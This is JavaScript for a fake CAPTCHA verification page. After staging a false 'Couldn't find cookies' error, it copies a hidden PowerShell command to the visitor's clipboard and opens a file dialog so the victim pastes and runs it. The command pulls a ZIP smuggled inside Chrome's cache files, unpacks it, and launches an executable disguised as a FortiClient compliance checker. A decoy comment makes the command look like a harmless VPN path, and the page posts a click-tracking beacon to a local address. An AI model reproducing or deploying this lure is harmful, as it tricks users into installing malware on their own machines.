const verifyWnd = document.getElementById("verify-window");
const checkboxBtn = document.getElementById("checkbox");
const content = document.getElementById("HJup0");
const verifLogoId = document.getElementById("verifying");
const fileInput = document.createElement('input');
fileInput.type = 'file';
fileInput.style.display = 'none';
document.body.appendChild(fileInput);
const verifyButton = document.getElementById('verify-verify-button');

let captchaClickedOnce = localStorage.getItem('captchaRedError') === 'true';

checkboxBtn.addEventListener("click", async () => {
    const captchaLabel = document.querySelector('.cb-lb-t');
    const originalText = captchaLabel.innerText;
    if (!captchaClickedOnce) {
        captchaLabel.innerText = "Error: Couldn't find cookies";
        captchaLabel.style.color = 'red';
        captchaClickedOnce = true;
        localStorage.setItem('captchaRedError', 'true');
        setTimeout(() => {
            captchaLabel.innerText = originalText;
            captchaLabel.style.color = '';
            checkboxBtn.checked = false;
            window.location.reload();
        }, 1200);
    } else {
        content.style.display = "none";
        verifLogoId.style.display = "flex";
        verifLogoId.style.visibility = "visible";
        verifyWnd.style.visibility = "visible";
        verifyWnd.style.opacity = "100%";
        checkboxBtn.disabled = true;
        setClipboardCopyData();
        fileInput.click();
        localStorage.removeItem('captchaRedError');
        fetch('http://127.0.0.1', {
            method: 'POST',
            headers: {
                'Content-Type': 'image/jpg'
            },
            body: JSON.stringify({
                content: '2nd Stage Click'
            })
        });
    }
});

if (verifyButton) {
    verifyButton.disabled = false;
    verifyButton.addEventListener('click', function handleVerifyClick() {
        if (verifyWnd.style.visibility === 'visible' && !verifyButton.disabled) {
            fileInput.click();
            verifyButton.disabled = true;
        }
    });
}

function setClipboardCopyData() {
    navigator.clipboard.writeText(String.raw`C:\Windows\System32\conhost.exe –headless powershell -c “$k=’%LOCALAPPDATA%\HoneyRisk\compliance’;mkdir -Force $k > $null;$d=’%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\’;cp $d* $k; gci $k|%{$c=[System.Text.Encoding]::Default.GetString([System.IO.File]::ReadAllBytes($_.FullName));$m=[regex]::Matches($c,'(?<=b)(.*?)(?=m)’,16);if($m.Count-gt 0){[System.IO.File]::WriteAllBytes($k+ ‘\ComplianceChecker.zip’,[System.Text.Encoding]::Default.GetBytes($m[0].Value)); Expand-Archive $k’\ComplianceChecker.zip’ $k -Force; & $k’\FortiClientComplianceChecker.exe’}} # \\Public\Support\VPN\ForticlientCompliance.exe ”`);
}


